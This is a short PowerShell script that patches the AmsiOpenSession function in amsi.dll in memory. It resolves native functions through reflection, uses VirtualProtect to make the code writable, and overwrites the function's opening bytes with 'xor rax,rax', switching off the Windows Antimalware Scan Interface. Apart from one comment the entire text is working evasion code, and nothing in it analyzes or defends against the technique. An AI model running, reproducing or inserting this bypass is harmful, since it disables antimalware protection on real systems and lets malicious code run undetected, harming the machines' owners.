function lookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @($assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName)), $functionName))
	
}

function getDelegateSig {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $typesArray,
		[Parameter(Position = 1)] [Type] $delType = [Void]
    )

	$Assembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($Assembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $ConstructorBuilder = $TypeBuilder.DefineConstructor(
      'RTSpecialName, HideBySig, Public', 
        [System.Reflection.CallingConventions]::Standard, 
          $typesArray).SetImplementationFlags('Runtime, Managed')

    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 
      'Public, HideBySig, NewSlot, Virtual', 
        $delType, 
          $typesArray).SetImplementationFlags('Runtime, Managed')

    $DelegateSig = $TypeBuilder.CreateType()

    return $DelegateSig
}

# modify AmsiOpenSession function beginning from test rdx,rdx to xor rax,rax

$OpenSessionA = lookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0

$VirtualProtectA = lookupFunc kernel32.dll VirtualProtect
$VirtualProtectSig = getDelegateSig -typesArray @([IntPtr], [int], [int], [UInt32].MakeByRefType()) -delType "Bool"
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectA, $VirtualProtectSig)

$VirtualProtect.Invoke($OpenSessionA, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $OpenSessionA, 3)
$VirtualProtect.Invoke($OpenSessionA, 3, 0x20, [ref]$oldProtectionBuffer)